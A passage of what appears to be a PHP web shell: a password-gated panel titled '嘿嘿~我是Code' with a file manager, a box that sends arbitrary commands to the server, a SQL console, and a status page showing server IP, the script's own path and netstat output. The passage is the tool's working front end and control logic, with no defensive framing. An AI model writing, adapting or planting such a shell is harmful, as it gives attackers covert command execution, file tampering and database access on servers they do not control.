                                    <a onClick='%s' href='javascript:;'>"+realpath_tmp+"</a> \
                                    <br> \
                                    <br> \
                                    <input type='button' value='Close' onClick='dialogOff();'> \
                                  </center>","downloadFile($(this).text());"),
                      function(){
                      }
                   );                   
                 }
                 else{
                   dialogOff();
                 }
               });
               //檢查檔案能否讀寫，不能就沒有儲存               
               if(trim(myAjax("?mode=IsWriteFile",
                                "filename="+encodeURIComponent($("#file_title_text").val())))=="true")
               {
                 $("#file_save_btn").show();
               }
               else
               {
                 $("#file_save_btn").hide();
               }
               //視同點到檔案編輯區
               $("#file_editor_li").find("a").trigger("click");                                   
             });  
             //下載
             $("*[name='download_a']").click(function(){               
               var file = $(this).find("span").text();                              
               downloadFile(file);
             });           
             //刪除                        
             $("*[name='del_a']").click(function(){               
               var file = $(this).find("span").text();               
               if(confirm("你確定要刪除「"+file+"」?")==true)
               {
                 myAjax("?mode=delFile",
                                "filename="+encodeURIComponent(file));
                 getDirs(window['now_dir']);                 
               }
             }); 
             $("*[name='detail_a']").click(function(){               
               window.open(window['now_url']+
                                $(this).find("span").text(),"_blank");
             });
             //載入loadSQLini();
             loadSQLini();
          });
        </script>
        <?php
        exit();
      break;
    case 'touchFile':
        check_login(true);
        $POSTS_STRING="filename";
        $POSTS=getGET_POST($POSTS_STRING,'POST');
        $POSTS['filename']=stripcslashes(html_entity_decode($POSTS['filename']));                                            
        if (stristr(PHP_OS, 'win')) {                
          if(mb_strripos($POSTS['filename'],":")!==false)
          {
            $POSTS['filename']=mb_substr($POSTS['filename'],mb_strripos($POSTS['filename'],":")-1,mb_strlen($POSTS['filename']));            
          }
          $POSTS['filename']=mb_convert_encoding($POSTS['filename'],'BIG5','UTF-8');
        }        
        if(touch($POSTS['filename']))
        {
          echo "1";
        }
        else
        {
          echo "0";
        }
        exit();
      break;
    case 'getSystemStatus':
        check_login(true);
        //取得系統資料
        $system_loading=get_server_load();
        ?>
        系統負載：<?php echo $system_loading;?>
        <br>
        記憶體使用：<span id='mem_span_usage'>計算中...</span> / <span id='mem_span'>計算中...</span>
        <script language="javascript">
          $(document).ready(function(){
            myAjax_async("?mode=getMemoryTotal","","#mem_span",function(){});
            myAjax_async("?mode=getMemoryUsage","","#mem_span_usage",function(){});
          });
        </script>
        <br>
        硬碟狀態：<br>
        <div style="margin-left:15px;">
        <?php
          getHDD_Status();
        ?>
        </div>
        Server IP：<?php echo $_SERVER["SERVER_ADDR"];?><br>
        Server Name：<?php echo $_SERVER["SERVER_NAME"];?><br>
        <?php echo basename(__FILE__);?> Place：<?php echo __FILE__;?><br>
        Netstat -an：<br>
        <div style="margin-left:15px;">
        <?php 
          get_netstat(); 
        ?>
        </div>
        <?php
        exit();
      break;
  }  
?>
<!DOCTYPE HTML>
<html>    
<head>
  <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
  <title>嘿嘿~我是Code</title>
  <style>
    *{
      font-family:'微軟正黑體';    
    }    
    .page_a{
      color:white;
    }
    .pre{
      font-family:monospace;
      white-space:pre;
    }
    img{
      border:0px;
    }
    html,body{      
      background-color:black;
      color:white;
      font-family:'微軟正黑體';
      padding:0px;
      margin:0px;
      font-size:12px;      
    }
    body{
      display:none;
    }
    a{
      color:white;
    }
    input[type='text'],input[type='password'],select,textarea{
      background-color:black;
      color:white;
      padding:5px;   
      border:1px solid #fff;   
    }
    #newfile_text{
      width:80%;
      margin-left:auto;
      margin-right:auto;
    }
    #tabs {
    	padding: 0px;
    	background: #000;
      display:none;    	
    }
    #tabs div{
      color:white;
    }
    #tabs .ui-tabs-nav {
    	background: transparent;
    	border-width: 0px 0px 1px 0px;
    	-moz-border-radius: 0px;
    	-webkit-border-radius: 0px;
    	border-radius: 0px;
      color:white;      
    }
    #tabs .ui-tabs-panel {
    	margin: 0em 0.2em 0.2em 0.2em;
      background: transparent;
    }
  </style>
  <link rel="stylesheet" href="http://code.jquery.com/ui/1.9.2/themes/base/jquery-ui.css" />
  <script src="http://code.jquery.com/jquery-1.8.3.js"></script>
  <script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>
  <script language="javascript" src="https://www.assembla.com/code/college_living/subversion/nodes/trunk/js/php.default.min.js?_format=raw&rev=25"></script>
  <script language="javascript" src="http://malsup.github.com/jquery.blockUI.js"></script>
  <script language="javascript">
  function dialogOn(message,functionAction)
  {
  	$.blockUI({
  		message : message,
  		css : {
  			backgroundColor : '#000',
  			color : '#fff',
  			padding:'15px'
  		},		
  		onBlock : function() {
  			functionAction();
  		}						
  	});
  }
  function dialogOff()
  {	
  	setTimeout(function(){
  		$.unblockUI();
  	},1000);
  }
  function myAjax(url,postdata)
  {
    var tmp = $.ajax({
        url: url,
        type: "POST",
        data: postdata,
        async: false
     }).responseText;
    return tmp;
  }
  function myAjax_async(url,postdata,dom,func)
  {
    $.ajax({
        url: url,
        type: "POST",
        data: postdata,
        async: true,
        success: function(html){
          $(dom).html(html);
          func();        
        }
    });  
  }
  function my_ids_mix(ids)
  {
    var m=new Array();
    m=explode(",",ids);
    var data=new Array();    
    for(i=0,max_i=m.length;i<max_i;i++)
    {
      array_push(data,m[i]+"="+encodeURIComponent($("#"+m[i]).val()));
    }
    return implode('&',data);
  }     
  
  <?php
    if(check_login(false)==TRUE)
    {
  ?>  
  function getDirs(path){
    var tmp = myAjax("?mode=getDirs","path="+path);
    $("#filetree").html(tmp);
  }   
  function get_textarea_edit_line(target,showline_div)
  {
    var caretPos = $("#"+target).val().substr(0,$("#"+target)[0].selectionStart);      
    var lines=0;
    lines=caretPos.split('\n').length;
    $("#"+showline_div).html("選擇的是：【"+lines+"】行");  
  }
  function touch_file(filename){
    var tmp = trim(myAjax("?mode=touchFile","filename="+filename));
    if(tmp=='1')
    {
      alert("檔案建立成功!");
    }
    else
    {
      alert("檔案建立失敗!");
    }
  }
  function htmlentities(str) {
    return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }
  function touch_file_confirm(){
    $("#newfile_text").val(trim($("#newfile_text").val()));
    if($("#newfile_text").val()!="")
    {
      if(confirm("你確定要建立檔案【"+$("#newfile_text").val()+"】?")==true){
        touch_file(window['now_dir']+$("#newfile_text").val());
        var create_file=$("#newfile_text").val();
        getDirs(window['now_dir']);                
        for(var i=0;i<$($("*[name='file_edit_filename']")).size();i++)
        {                        
          if($($("*[name='file_edit_filename']")[i]).text()==create_file)
          {
            $($("*[name='file_edit_filename']")[i]).trigger("click");            
            break;
          }
        }
        $("#newfile_text").remove();
      }
   }
   $("#newfile_text").remove();
  }
  <?php
    }
  ?>
  </script>
  <?php
    if(check_login(false)==TRUE)
    {
  ?>
  <script language="javascript"> 
	$(document).ready(function() {
     //preset
     $("body").show();
     window['now_dir']=".<?php echo jsAddSlashes(DIRECTORY_SEPARATOR);?>";     
     window['now_url']="";
  	 getDirs(window['now_dir']);
     
     //當畫面被關掉，移除.tmp
     $(window).unload(function(){       
       myAjax("?mode=unload","");       
     });
     
     //更新
     $("#refresh_a").click(function(){
       getDirs(window['now_dir']);
     });
     $("#orin_dir").click(function(){
       window['now_dir']=".<?php echo jsAddSlashes(DIRECTORY_SEPARATOR);?>";
       getDirs(".<?php echo jsAddSlashes(DIRECTORY_SEPARATOR);?>");
     });
     //檔案第幾行
     $("#file_contents_textarea").keyup(function(){
       get_textarea_edit_line($(this).attr('id'),"file_line");
     });
     $("#file_contents_textarea").focus(function(){
       get_textarea_edit_line($(this).attr('id'),"file_line");
     });
     $("#file_contents_textarea").mouseup(function(){
       get_textarea_edit_line($(this).attr('id'),"file_line");
     });  
       
     $("#config_setting_textarea").keyup(function(){
       get_textarea_edit_line($(this).attr('id'),"config_setting_line");
     });
     $("#config_setting_textarea").focus(function(){
       get_textarea_edit_line($(this).attr('id'),"config_setting_line");
     });
     $("#config_setting_textarea").mouseup(function(){
       get_textarea_edit_line($(this).attr('id'),"config_setting_line");
     });       
     $("#cmd_btn").click(function(){
       var tmp=myAjax("?mode=cmd_run",
                        "cmd="+encodeURIComponent($("#cmd_textarea").val()));
       $("#cmd_output").html(tmp);
     });
     //登出
     $("#logout a").click(function(){
       if(confirm("你確定要登出嗎?")==true)
       {
         myAjax("?mode=logout","");
         location.reload();
       }
     });
     //開新檔案
     $("#new_file_a").click(function(){
       if($("#newfile_text").size()==0)
       {
         $("#filetree").append("<input type='text' id='newfile_text'>");         
       }
       $("#newfile_text").focus();
       $("#newfile_text").blur(function(){
         touch_file_confirm();
         return false;
       });        
       $("#newfile_text").keyup(function(e) {  
          if(e.which==13)
          {                          
            $("#newfile_text").attr('disabled',true); 
            $("#newfile_text").blur();                    
          }            
       });
     });
     //儲存
     $("#file_save_btn").click(function(){
       $("#file_title_text").val(trim($("#file_title_text").val()));
       if($("#file_title_text").val()!="")
       {
         myAjax("?mode=saveFile",
                my_ids_mix("file_title_text,file_contents_textarea"));
         alert("Done!");                           
       }
     });
     $("#file_reset_btn").click(function(){
       //重載的按鈕
       var bn=basename($("#file_title_text").val());
       var check=false;
       for(var 
           i=0,
           name=$($("*[name='file_edit_filename']")),
           max_i=$($("*[name='file_edit_filename']")).size();           
           i<name.size();
           i++)
       {
         if(bn==name.eq(i).text())
         {
           name.eq(i).trigger("click");
           check=true;
           break;
         }
       }
       if(check==false)
       {
         alert("找不到此檔案...");
         $("#file_contents_textarea").html('');
       }                         
     });
     //系統狀態
     $("#system_status_btn").click(function(){
       myAjax_async("?mode=getSystemStatus","","#system_status_div",function(){});       
     });
     
     $("#system_status_btn").trigger("click");
     //SQL設定儲存的按鈕
     $("#config_setting_btn").click(function(){
       if(confirm("你確定要變更SQL設定檔嗎?")==true){
         dialogOn("寫入並測試SQL設定中...",function(){
           //alert("<?php echo jsAddSlashes($base_db_ini);?>");          
           myAjax("?mode=saveFile",
                    "file_title_text="+encodeURIComponent("<?php echo jsAddSlashes($base_db_ini);?>")+
                    "&file_contents_textarea="+encodeURIComponent($("#config_setting_textarea").val())
                 );
           var check=trim(myAjax("?mode=checkSQLSetting",""));
           if(check=="false")
           {
             alert("SQL設定資料錯誤...");
             $("#sql_run_li").hide();
           }      
           else
           {
             alert("Done!");
             $("#sql_run_li").show();
             location.reload();
           }
           dialogOff();
         });
       } 
     });
     //SQL設定檔重載按鈕
     $("#config_setting_reset").click(function(){
       if(confirm("你確定要重載設定檔嗎?")==true){       
         loadSQLini();
       }
     });
     //SQL範例檔
     $("#config_setting_example_a").click(function(){
       $("#config_setting_textarea").val("<?php echo jsAddSlashes($config_templete);?>");
     });
     //快按
     $("#sql_fast_btn").change(function(){
       $("#sql_textarea").val(trim($(this).val()));
       $("#sql_btn").trigger("click");
     });
     $("#sql_btn").click(function(){
       $("#sql_textarea").val(trim($("#sql_textarea").val()));
       
       if($("#sql_textarea").val()!="")
       {
         //檢查值有沒有加到 select 裡面，沒有就加 Start
         var options=$("#sql_fast_btn option");
         var check=false;
         for(var i=0,max_i=options.size();i<max_i;i++)
         {                      
           if(trim(options.eq(i).val())==trim($("#sql_textarea").val()))
           {
             check=true;
             break;
           }
         }
         if(check==false)
         {
           $("#sql_textarea").val(trim($("#sql_textarea").val()));
           $("#sql_fast_btn").append(
             sprintf("<option value=\"\">%s</option>",$("#sql_textarea").val())
           );
           $($("#sql_fast_btn option").eq($("#sql_fast_btn option").size()-1)).val($("#sql_textarea").val());
           
         }
         //檢查值有沒有加到 select 裡面，沒有就加 End
                
         dialogOn("SQL執行中...",function(){
           myAjax_async("?mode=sql_data",
                                    "sql="+encodeURIComponent($("#sql_textarea").val())+
                                    "&domid=sql_output"+
                                    "&is_need_page="+(($("#is_need_page").prop('checked')==true)?'1':'0')
                                    ,"#sql_output"
                                    ,function(){
                                      dialogOff();
                                    }                                    
                        );           
         });
       }
     });
     //初值
     //資料庫應用
     var j_tmp = json_decode(myAjax("?mode=getDBTpl","DB_KIND=<?=$ini_settings['DB_KIND'];?>"));
     var tmp = '';
     for(var i=0;i<j_tmp.length;i++)
     {   
       for(var x in j_tmp[i])
       {
         //alert(addslashes(jsAddSlashes(j_tmp[i][x])));
         tmp+=sprintf("<option value=''>%s</option>",x);
       }       
     }
     $("#sql_fast_btn").append(tmp);
     for(var i=0;i<j_tmp.length;i++)
     {   
       for(var x in j_tmp[i])
       {
         //alert(j_tmp[i][x]);
         $("#sql_fast_btn option:contains('"+x+"')").val(j_tmp[i][x]);
       }
     }
     $("#db_kind_title").html("<?=$ini_settings['DB_KIND'];?>");
     $("#tabs").tabs({ 
       'active': 0 
     });
     $("#tabs").show();
     //SQL執行區能否使用
     <?php
      if($pdo==null)
      {
        ?>
        $("#sql_run_li").hide();
        <?php
      }
     ?>     
	});
  </script>
  <?php
  }
  else
  {
  ?>
  <script language="javascript">
    $(document).ready(function(){
      //當畫面被關掉，移除.tmp
      $(window).unload(function(){       
        myAjax("?mode=unload","");       
      });    
      $("body *").remove();
      $("body").show();
      dialogOn("請輸入登入密碼...<br><br> \
                  <center> \
                    <input type='password' id='password' name='password'> \
                    &nbsp;&nbsp;&nbsp; \
                    <input type='button' id='login_btn' value='Go'> \
                  </center>"
          ,function(){
            $("#password").keyup(function(event){
              if(event.which==13)
              {
                $("#login_btn").trigger('click');
              }
            });
            $("#login_btn").click(function(){
              $("#password").val(trim($("#password").val()));
              if($("#password").val()=="")
              {
                return false;
              }
              else
              {
                myAjax("?mode=login",my_ids_mix("password"));                
                location.replace("?");
              }
            });
          });
    });
  </script>
  <?php
  }
  ?>
</head>
<body>
  <table border="1" cellpadding="5" cellspacing="0" width="100%">
    <tr>
      <td width="250" valign="top">
        <!--檔案列表 Start-->
        <div id="file_list_control_div" style="text-align:right;">          
          <a href="javascript:;" id="new_file_a">開新檔案</a>
          &nbsp;&nbsp;&nbsp;
          <a href="javascript:;" id="orin_dir">回原目錄</a>
          &nbsp;&nbsp;&nbsp;
          <a href="javascript:;" id="refresh_a">更新</a>
        </div>
        <br>
        <!--Tree-->
        <div id="filetree">
        </div>
        <!--檔案列表 End-->
      </td>
      <td valign="top"> 
        <div id="tabs">
          <ul>
            <li id="system_status_li"><a href="#tabs-0" name="tabs_names">系統狀態</a></li>
            <li id="file_editor_li"><a href="#tabs-1" name="tabs_names">檔案編輯區</a></li>
            <li id="cmd_run_li"><a href="#tabs-2" name="tabs_names">Command執行區</a></li>
            <li id="sql_run_li"><a href="#tabs-3" name="tabs_names">SQL執行區</a></li>
            <li id="config_setting_li"><a href="#tabs-4" name="tabs_names">環境設定區</a></li>            
            <li id="logout"><a href="#tabs-5" name="tabs_names">登出</a></li>
          </ul>
          <div id="tabs-0">
             <!--系統狀態 Start-->
             <div align="right">
              <input id="system_status_btn" type="button" value="狀態更新">              
             </div>
             <div id="system_status_div"></div>
             <!--系統狀態 End-->
          </div>          
          <div id="tabs-1">
             <!--檔案編輯區 Start-->
             <div id="file_edit_div">
              檔案名稱：<input type="text" id="file_title_text" style="width:80%">
              <br><br>
              <textarea id="file_contents_textarea" style="position:relative;margin-left:auto;margin-right:auto;max-width:98%;width:95%;height:500px;"></textarea>
              <br>
              <span id="file_line"></span>
              <br>
              <br>
              <input type="button" id="file_save_btn" value="儲存">
              &nbsp;&nbsp;&nbsp;
              <input type="button" id="file_reset_btn" value="重載">
             </div>
             <!--檔案編輯區 End-->
          </div>
          <div id="tabs-2">
             <!--Command執行區 Start-->
             <div id="cmd_div">
              Command執行區：
              <br>
              <br>
              <textarea id="cmd_textarea" style="width:95%;height:150px;"></textarea>
              <br>
              <br>
              <input type="button" id="cmd_btn" value="執行">
              <br>
              <br>
              <div id="cmd_output" class="pre"></div>
             </div>
             <!--Command執行區 End-->
          </div>
          <div id="tabs-3">
             <!--SQL執行測試區 Start-->
             <div id="sql_div">
              【<span id="db_kind_title">SQL</span> 】執行區：
              <br>
              <br>
              <select id="sql_fast_btn">
                <option value="">--請選擇--</option>                
              </select>
              <br><br>
              <textarea id="sql_textarea" style="width:95%;height:250px;"></textarea>
              <br>
              分頁需求？<input type="checkbox" value="1" id="is_need_page" name="is_need_page">
              <br>
              <br>
              <input type="button" id="sql_btn" value="執行">
              <br>
              <br>
              <div id="sql_output"></div>
             </div>
             <!--SQL執行測試區 End-->
          </div>
          <div id="tabs-4">
             <!--環境設定區 Start-->
             <div id="sql_div">
              環境設定區：(<a href="javascript:;" style="color:#fae;" id="config_setting_example_a">套用設定範本</a>)<br><br>                  
              <textarea id="config_setting_textarea" style="font-size:24px;width:90%;height:300px;"></textarea>
              <br>
              <span id="config_setting_line"></span>
              <br>
              <br>
              <input type="button" id="config_setting_btn" value="儲存">
              &nbsp;&nbsp;&nbsp;
              <input type="button" id="config_setting_reset" value="重讀">
             </div>
             <!--環境設定區 End-->
          </div>          
        </div>
      </td>
    </tr>
  </table>
</body>
</html>
